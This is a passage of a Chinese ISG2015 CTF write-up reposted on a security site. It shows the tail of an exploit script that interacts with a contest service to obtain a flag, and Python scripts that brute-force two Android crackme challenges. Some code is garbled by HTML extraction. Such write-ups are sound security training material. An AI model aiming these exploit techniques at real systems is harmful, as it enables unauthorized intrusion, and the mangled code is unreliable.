    #io = zio(target, timeout=10000, print_read=COLORED(REPR, 'red'), print_write=COLORED(REPR, 'green'))
    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))
    for ch_t in path:
        io.writeline(ch_t)
    io.writeline('flag')
    io.interact()
exp(target)
</pre>
<p>得到flag:</p>
<p><a href="http://p0.qhimg.com/t018156aee352752644.png" target="_blank"><img title="t01afff4ab042c9c471.png" src="http://p0.qhimg.com/t018156aee352752644.png" alt="http://p5.qhimg.com/t01afff4ab042c9c471.png" /></a></p>
<h2>Mobile</h2>
<h3>Forest (150)</h3>
<p>首先观察这个函数:</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/13.png"><img class="alignnone size-full wp-image-39431" src="http://www.secpulse.com/wp-content/uploads/2015/10/13.png" alt="13" width="459" height="419" /></a></p>
<p>&nbsp;</p>
<p>在判断相等的时候使用的长度实际上是nj和v1中较短的一个长度。而nj即为字符串” VFT}E7gy4yfE7tuG6{”。</p>
<p>那么在:</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/14.png"><img class="alignnone size-full wp-image-39432" src="http://www.secpulse.com/wp-content/uploads/2015/10/14.png" alt="14" width="517" height="104" /></a></p>
<p>&nbsp;</p>
<p>这里对输入进行了cc,ca,cb三种不同变换方式后进行了拼接,其中ca和cc在变化后的长度是保持不变的。</p>
<p>这里猜测如果输入的长度和”VFT}E7gy4yfE7tuG6{“长度相等的话。那么ca和cb两种加密方式实际上是没有任何用处的。cc的加密方式是逐位的,这里直接逐位爆破了,得到flag。</p>
<pre>__author__ = 'bibi'
   target='VFT}E7gy4yfE7tuG6{'
   for i in range(len(target)):
       rr=""
       print "\n",
       for j in range(0xff):
           temp=0
           if j 109:
               if j &gt;=65 and j&lt;=77:                    temp=j+13                elif j&gt;=110 and j   &lt;=122:                    temp=j-13                elif j&gt;=78 and j   &lt;=90:                    temp=j-13                elif j&gt;=48 and j&lt;=57:
                   temp=j^7
               else:
                   temp=j^6
           else:
               temp=j+13
           if target[i]==chr(temp):
               print chr(j),

</pre>
<h3>lol (250)</h3>
<p>Java层逻辑比较简单,就是调用so里面的getflag代码进行判断,返回‘1’就成功,直接分析so文件,发现里面有2个可疑的函数check和en,其实根据参数很容易判断出来,getflag函数就是IDA里面的en函数,其实看代码可以发现,en函数里面的一部分代码就是check函数,而且把check函数抠出来,单独跑功能就是比较两个字符串是否相等,从而返回‘1’或者‘0’。所以重要的是en函数。</p>
<p><a href="http://p2.qhimg.com/t013461e1564206a1e5.png" target="_blank"><img title="t01c96c67eaada298b2.png" src="http://p2.qhimg.com/t013461e1564206a1e5.png" alt="http://p9.qhimg.com/t01c96c67eaada298b2.png" /></a></p>
<p>en函数的代码是经过控制流混淆的,乍一看特别乱,如下:</p>
<p><a href="http://p2.qhimg.com/t016087b26bdf4c1595.png" target="_blank"><img title="t0161d5d5fbe0c594e4.png" src="http://p2.qhimg.com/t016087b26bdf4c1595.png" alt="http://p6.qhimg.com/t0161d5d5fbe0c594e4.png" /></a></p>
<p>但是由于找到了里面存在check函数代码,其实思路也简单,应该就是将输入字符串经过处理,然后check一下,由于里面的运算很少,逻辑是很简单的,所以先理清楚控制流逻辑,将算法还原。</p>
<p>为了找到控制流,我将代码抠出来,在每个重要的运算或者判断前面加上log标志,然后修改部分代码,让其成为正常的c程序, 如下:</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/15.png"><img class="alignnone size-full wp-image-39433" src="http://www.secpulse.com/wp-content/uploads/2015/10/15.png" alt="15" width="452" height="137" /></a></p>
<p>&nbsp;</p>
<p>说明:1和4都是运算逻辑,2和6都是判断逻辑</p>
<p>构造输入,看输出信息,如下:</p>
<p><a href="http://p3.qhimg.com/t0186c7bdc1a1e722a9.png" target="_blank"><img title="t01227c3a29450dcb96.png" src="http://p3.qhimg.com/t0186c7bdc1a1e722a9.png" alt="http://p5.qhimg.com/t01227c3a29450dcb96.png" /></a></p>
<p>可以看到流程,前面三个走了1,后面依次是2-6-1循环,由于有条指令不确定,但是其结果只能是0或者1,如下,所以两种都试下:</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/16.png"><img class="alignnone size-full wp-image-39434" src="http://www.secpulse.com/wp-content/uploads/2015/10/16.png" alt="16" width="341" height="174" /></a></p>
<p>&nbsp;</p>
<p>结果就是将前面的1替换成4,据此就看看出流程了,</p>
<pre>for i in range(24):
         if i &lt; 3:
                   do 1 或者4
         else:
                   判断 2和6
                   do 1或者 4
</pre>
<p>完整的python代码如下:</p>
<pre>__author__ = "pxx"
sign = 1
aNzRol68hviis8q = [ord(c) for c in "NZ@rol68hViIs8qlX~7{6m&amp;t"];
val_list = []
v30 = range(24)
for index in range(24):
         for ch_t in range(256):
                   v30[index] = ch_t
                   v13 = 0
                   if index &lt; 3:
                            if sign == 1:
                                     v13 = (v30[index] &amp; 0x26 | ~v30[index] &amp; 0xD9) ^ 0xDE;
                            else:
                                     v13 = (v30[index] &amp; 0xF6) | ~v30[index] &amp; 9;
                   else:
                            if v30[index] &lt; ord('A') or v30[index] &gt; ord('Z'):
                                     if sign == 1:
                                               v13 = (v30[index] &amp; 0x26 | ~v30[index] &amp; 0xD9) ^ 0xDE;
                                     else:
                                               v13 = (v30[index] &amp; 0xF6) | ~v30[index] &amp; 9;
                   #print v13
                   if v13 == aNzRol68hviis8q[index]:
                            print index, "find one:",chr(v30[index])
                            if sign == 0:
                                     sign = 1
                            else:
                                     sign = 0
                            break
                            #value
print v30
v30 = [chr(c) for c in v30]
print "".join(v30)
</pre>
<p>flag:</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/171.png"><img class="alignnone size-full wp-image-39436" src="http://www.secpulse.com/wp-content/uploads/2015/10/171.png" alt="17" width="660" height="88" /></a></p>
<p>&nbsp;</p>
<p>[原文：<a href="http://bobao.360.cn/learning/detail/702.html" target="_blank">ISG2015 FlappyPig Writeup</a>  安全脉搏编辑整理发布】</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
		<div class="pageShenming">
【安全脉搏：分享技术、悦享品质。文章仅代表作者看法，如有不同观点，欢迎添加安全脉搏微信号：SecPulse，进行交流。】</div>
<div class="post-tags"><span>Tags: </span><a href="https://www.secpulse.com/archives/tag/collision" rel="tag">collision</a><a href="https://www.secpulse.com/archives/tag/crypto" rel="tag">Crypto</a><a href="https://www.secpulse.com/archives/tag/flagfinder" rel="tag">flagfinder</a><a href="https://www.secpulse.com/archives/tag/flappypig" rel="tag">FlappyPig</a><a href="https://www.secpulse.com/archives/tag/fruit-store" rel="tag">Fruit Store</a><a href="https://www.secpulse.com/archives/tag/gettext_underbuilding" rel="tag">gettext_underbuilding</a><a href="https://www.secpulse.com/archives/tag/image-database" rel="tag">Image Database</a><a href="https://www.secpulse.com/archives/tag/isg256bit_is_weak" rel="tag">ISG{256bit_is_weak}</a><a href="https://www.secpulse.com/archives/tag/isgi_am_a_sw337_f14g" rel="tag">ISG{I_am_A_sW337_F14g}</a><a href="https://www.secpulse.com/archives/tag/isgwhatab0utacupofte4" rel="tag">ISG{whatAb0uTacupoFte4}</a><a href="https://www.secpulse.com/archives/tag/isg2015-writeup" rel="tag">ISG2015 Writeup</a><a href="https://www.secpulse.com/archives/tag/rsatools" rel="tag">rsatools</a><a href="https://www.secpulse.com/archives/tag/tell_me_who_u_are" rel="tag">tell_me_who_u_are</a><a href="https://www.secpulse.com/archives/tag/webdroid" rel="tag">webdroid</a></div>
		</div>
	<!-- .single-content -->
		<div class="pageActive">
	<div class="mark-like-btn">
							</div>
	<!-- Baidu Button BEGIN -->
	<div class="bdshare">
		<div class="bdsharebuttonbox">
			<a href="#" class="bds_more" data-cmd="more"></a><a href="#"
				class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a><a href="#"
				class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#"
				class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
		</div>
		<script>
		window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"32"},"share":{}};
		with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
		</script>

	</div>
</div>    <section id="text-6" class="widget-container widget_text hidden-xs">			<div class="textwidget"><center><a href="https://www.duoyinsu.com" target="_blank" title="安识科技 专业安全服务商"><img src="https://www.secpulse.com/wp-includes/images/secweixin.png" style="width:785px;height:315px"></a><center></div>
		</section><section id="related_post-2" class="widget-container widget_related_post hidden-xs"><h3 class="widget-title">相关文章</h3>

	<ul class="related_post">
				<li><a href="https://www.secpulse.com/archives/58354.html" title="详细阅读 2017第三届SSCTF全国网络安全大赛圆满结束">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2017/05/SSCTF.jpg&h=150&w=249&zc=1" alt="2017第三届SSCTF全国网络安全大赛圆满结束" class="xg-img"/>
		<p>2017第三届SSCTF全国网络安全大赛&hellip;</P></a></li>
				<li><a href="https://www.secpulse.com/archives/42334.html" title="详细阅读 ZCTF Writeup">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2016/01/ZCTF.png&h=150&w=249&zc=1" alt="ZCTF Writeup" class="xg-img"/>
		<p>ZCTF Writeup</P></a></li>
				<li><a href="https://www.secpulse.com/archives/38530.html" title="详细阅读 2015年第六届全国网络安全大赛（XDCTF）">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2015/09/1c950a7b02087bf4368086aaf1d3572c11dfcf01.jpg&h=150&w=249&zc=1" alt="2015年第六届全国网络安全大赛（XDCTF）" class="xg-img"/>
		<p>2015年第六届全国网络安全大赛（XDC&hellip;</P></a></li>
			</ul>


</section></article>


<!-- 引用 -->
<div id="comments" class="comments-area">
	<h2 class="comments-title">
		抢沙发
	</h2>
			<div id="respond" class="comment-respond row">
		


			<form action="https://www.secpulse.com/wp-comments-post.php" method="post" id="commentform">
		
				
						
			<div id="comboxinfo">
					<div class="cominfodiv cominfodiv-author ">
					<p for="author" class="nicheng">
     <input type="text" name="author" id="author" class="texty" value="" tabindex="1" /> <span class="required">昵称*</span>
      </p>
</div>
					<div class="cominfodiv cominfodiv-email">
					<p for="email">	<input type="text" name="email" id="email" class="texty" value="" tabindex="2" /> <span class="required">邮箱*</span>
						</p>
					</div>
					<div class="cominfodiv cominfodiv-url">
					 	<p for="url"><input type="text" name="url" id="url" class="texty" value="" tabindex="3" /><span>网址 </span>
						</p>
					</div>
					
			
				
</div>		       <div class=" cominfodiv-nr">  
<textarea class="texty" name="w" id="comment" rows="10" tabindex="4" placeholder="输入评论内容..."></textarea><textarea name="comment" cols="100%" rows="4" style="display:none"></textarea>
							<div class="submitcom">
							
					<input id="submit" name="submit" type="submit" tabindex="5" value="提&nbsp;交"/>
					<input type='hidden' name='comment_post_ID' value='39058' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="0e9ed96175" /></p><p style="display: none;"><input type="hidden" id="ak_js" name="ak_js" value="188"/></p>				</div>
				<div id="cancel_comment_reply"><a rel="nofollow" id="cancel-comment-reply-link" href="/archives/39058.html#respond" style="display:none;">取消回复</a></div>
			
</div>
			
				
			</form>
			
			
			<script type="text/javascript">
				document.getElementById("comment").onkeydown = function (moz_ev){
				var ev = null;
				if (window.event){
				ev = window.event;
				}else{
				ev = moz_ev;
				}
				if (ev != null && ev.ctrlKey && ev.keyCode == 13){
				document.getElementById("submit").click();}
				}
			</script></div>
	 		
</div>
<!-- #comments --></div>
		
<div class="xs-right sidebar xs-hidden xss-hidden">
	<div class="authorbox">
	<div class="author-top">
<div id="author-img">
<img src="https://www.secpulse.com/wp-content/uploads/2014/12/b_4216_20111222020023739433835-150x150.jpg" width="96" height="96" alt="SP胖编" class="avatar avatar-96 wp-user-avatar wp-user-avatar-96 alignnone photo" />
</div>
<div class="au-name">
<a href="https://www.secpulse.com/archives/author/sp_panbian" title="由SP胖编发布" rel="author">SP胖编</a><br>
 <span class="au-title">总共60篇文章</span>
</div> </div>
	<div class="author-word"><span class="quotes q1"></span>
神器 神器 神器	<span class="quotes q2"></span></div>
	</div>
	
				<aside id="recent-posts-2" class="widget-container widget_recent_entries">		<div class="si-title"><h2>最新脉搏</h2></div>		<ul>
					<li>
				<a href="https://www.secpulse.com/archives/60653.html">《安天365安全研究》第5期</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60630.html">供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60605.html">2017先知创新大会：有ZHI而来</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60576.html">甲方工作杂谈</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60394.html">Catfish—缓存漏洞&#038;&#038;配合CSRF到Getshell</a>
						</li>
				</ul>
		</aside><aside id="hot_comment-3" class="widget-container widget_hot_comment"><div class="si-title"><h2>脉搏热评</h2></div>
	<ul class="hot_comment_widget">
		
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59497.html" rel="bookmark" title="XSS挑战之旅学习总结 (7条评论)" >XSS挑战之旅学习总结</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59065.html" rel="bookmark" title="web安全之如何全面发现系统后台 (6条评论)" >web安全之如何全面发现系统后台</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59770.html" rel="bookmark" title="电商的支付风控怎么玩？ (3条评论)" >电商的支付风控怎么玩？</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59466.html" rel="bookmark" title="安天移动安全联合猎豹揭秘无形之贼Dosoft免杀病毒 (2条评论)" >安天移动安全联合猎豹揭秘无形之贼Doso&hellip;</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59262.html" rel="bookmark" title="跟着DVWA学Web安全开发 (2条评论)" >跟着DVWA学Web安全开发</a></li>			</ul>

</aside><aside id="random_post-2" class="widget-container widget_random_post"><div class="si-title"><h2>随机脉搏</h2></div>

	<ul class="random_post">
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/19029.html" rel="bookmark" title="详细阅读 7天酒店员工可SQL注射内部系统查看几十万故障单(泄露同事帐号密码等)">7天酒店员工可SQL注射内部系统查看几十万故障单(泄露同事帐号密码等)</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/19775.html" rel="bookmark" title="详细阅读 百度贴吧某功能CSRF漏洞callback参数问题">百度贴吧某功能CSRF漏洞callback参数问题</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/13856.html" rel="bookmark" title="详细阅读 联通某站多处SA权限SQL注入点">联通某站多处SA权限SQL注入点</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/15801.html" rel="bookmark" title="详细阅读 拉卡拉某分站命令执行漏洞 (内网渗透危害较大请尽快修复)">拉卡拉某分站命令执行漏洞 (内网渗透危害较大请尽快修复)</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/51120.html" rel="bookmark" title="详细阅读 美国NSA方程式组织Equation Group被黑,大量黑客工具泄露">美国NSA方程式组织Equation Group被黑,大量黑客工具泄露</a></li>
					</ul>


</aside><aside id="text-11" class="widget-container widget_text"><div class="si-title"><h2>脉搏官方微信公众号</h2></div>			<div class="textwidget"><img src="https://www.secpulse.com/wp-includes/images/SecPulse.png" width="280px" height="364px" /></div>
		</aside>				</div>
	</div>

	</section>

  <div class="inner row visible-lg-block">

	<div class="friends">
		<h3>友情链接</h3>
		<ul>
			<li><a href="https://xianzhi.aliyun.com/forum/?secpulse" target="_blank">先知安全社区</a><span>|</span></li>
			<li><a href="https://threathunter.org/" target="_blank">ThreatHunter社区</a><span>|</span></li>
			<li><a href="http://www.ijiandao.com/" target="_blank">网络尖刀</a><span>|</span></li>
			<li><a href="http://navisec.it/" target="_blank">NaviSec导航</a><span>|</span></li>
		    <li><a href="https://www.easyaq.com/" target="_blank">E安全</a><span>|</span></li>
			<li><a href="http://www.sec-wiki.com/" target="_blank">Sec-Wiki</a><span>|</span></li>
			<li><a href="http://www.waitalone.cn/" target="_blank">独自等待</a><span>|</span></li>
			<li><a href="http://www.shellsec.com/" target="_blank">神刀网</a><span>|</span></li>
			<li><a href="http://www.ineice.com/" target="_blank">爱内测</a><span>|</span></li>
			<li><a href="http://www.itet.cn/" target="_blank">北京ITET培训中心</a><span>|</span></li>
			<li><a href="http://www.ihonker.org/" target="_blank">中国红客联盟</a><span>|</span></li>
			<li><a href="http://www.bigniu.com/" target="_blank">比戈大牛</a><span>|</span></li>
			<li><a href="http://www.tiejiang.org/" target="_blank">铁匠运维网</a><span>|</span></li>
			<li><a href="http://www.nagain.com" target="_blank">娜迦信息</a><span>|</span></li>
			<li><a href="https://www.secsilo.com/" target="_blank">SecSilo</a><span>|</span></li>
			<li><a href="https://team.armyzer0.com" target="_blank">armyzer0</a><span>|</span></li>
			<li><a href="http://www.nosafe.org" target="_blank">NoSafe</a></li>
		</ul>
	</div>

	<div class="friends">
		<h3>合作伙伴</h3>
		<ul>
			<a href="https://www.duoyinsu.com" class="external" target="_blank">
				<img src="https://www.secpulse.com/wp-content/uploads/anshi-logo.png"
				alt="安识科技" width="150px" height="45px">
			</a>
			<a href="http://aq.163.com/module/partner.html" class="external"
				target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/netease.jpg"
				alt="网易安全中心" width="150px" height="45px">
			</a>
			<a href="https://security.alibaba.com/" class="external"
				target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/asrc.jpg"
				alt="阿里安全中心" width="150px" height="45px">
			</a>
			
			<a href="http://yaq.qq.com/" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/yaqnew.png" alt="腾讯御安全"
				width="140px" height="45px">
			</a>
			
			<a href="http://www.4hou.com" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/4hou.png"
				alt="嘶吼RoarTalk" width="150px" height="45px">
			</a>
			
			<a href="http://www.ichunqiu.com/?from=secpulse" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/ichunqiu.png" alt="i春秋学院"
				width="140px" height="45px">
			</a>

			<a href="#" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/bigsec.png" alt="bigsec岂安科技"
				width="140px" height="45px">
			</a>
		
			<a href="http://www.milw0rm.cn/" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/milw0rm.png"
				alt="Milw0rm Team" width="120px" height="40px">
			</a>


			<a href="#" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/cloversec.png"
				alt="四叶草安全" width="130px" height="45px">
			</a>
			<a href="https://www.aqdog.com" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/aqdog.png"
				alt="安犬云平台" width="140px" height="45px">
			</a>
			
			<a href="http://www.e365.org/" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/e365.png"
				alt="易安在线" width="130px" height="45px">
			</a>
			
			
			

		</ul>
	</div>
</div>
<footer class="footer clr" id="footer">
	<div class="inner inner-footer">
		<div class="footer-secpulse">
			<h3>SecPulse</h3>
			<ul>
				<li><a href="/about">关于SecPulse</a></li>
				<!--<li><a href="http://test.secpulse.com">SecPulse专测</a> <sup>NEW!</sup></li>-->
				<li><a href="/hire">加入我们</a></li>
				<li><a href="/report">寻求报道</a></li>
				<li><a href="/contact-us">联系我们</a></li>
			</ul>
		</div>
		<div class="footer-subscribe xs-hidden">
			<h3>订阅</h3>
			<ul>
				<li><a href="/feed">RSS订阅</a></li>
				<li><a href="/feed">邮箱订阅</a></li>
				<li><a href="/feed">线下活动订阅</a></li>
				<li></li>
				<li><a href="http://weibo.com/311057789">官方微博</a></li>
				<!-- <li><a href="https://twitter.com/secpulse">Twitter</a></li> -->
			</ul>
		</div>
		<div class="footer-partner">
			<h3>全力驱动</h3>
			<ul class="cf">
				<li><a href="https://www.secpulse.com" class="external"
					target="_blank"><img
						src="https://www.secpulse.com/wp-content/uploads/seclogo.png"
						alt="安全脉搏" width="200px"></a></li>
			</ul>
		</div>
		<div class="footer-copyright xs-hidden">
			<p>本站由SecPulse安全脉搏团队全力维护。</p>
			<p>
				Powered By <a title="安全脉搏" href="https://www.secpulse.com">SecPulse</a>
			</p>
			<p>©2013-2017 安全脉搏</p>
			<p>沪ICP备16016474号</p>
			<img src="https://www.secpulse.com/wp-includes/images/qrcode.jpg"
				alt="Qrcode" height="150px" width="150px">

		</div>
	</div>
</footer>
<div id="shangxia">
	<div id="shang" title="↑ 返回顶部"></div>
              <div id="comt" title="查看评论"></div>
              <div id="xia" title="↓ 移至底部"></div>
</div>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/plugins/akismet/_inc/form.js?ver=3.1.2'></script>
</body>

</html>
